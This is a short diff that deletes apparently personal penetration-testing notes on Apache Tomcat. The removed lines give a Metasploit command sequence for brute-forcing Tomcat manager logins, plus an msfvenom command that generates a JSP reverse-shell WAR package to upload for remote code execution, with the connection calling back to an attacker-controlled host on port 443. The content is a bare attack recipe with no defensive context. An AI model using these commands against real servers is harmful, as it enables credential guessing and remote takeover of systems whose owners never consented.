@@ -1,7 +1,0 @@
-> tomcat manager login brute force:
-  > use auxiliary/scanner/http/tomcat_mgr_login
-  > set stop_on_success true
-  > set RHOSTS
-  
-> msfvenom war package for RCE in Tomcat:
-  > msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local ip> LPORT=443 -f war > shell.war
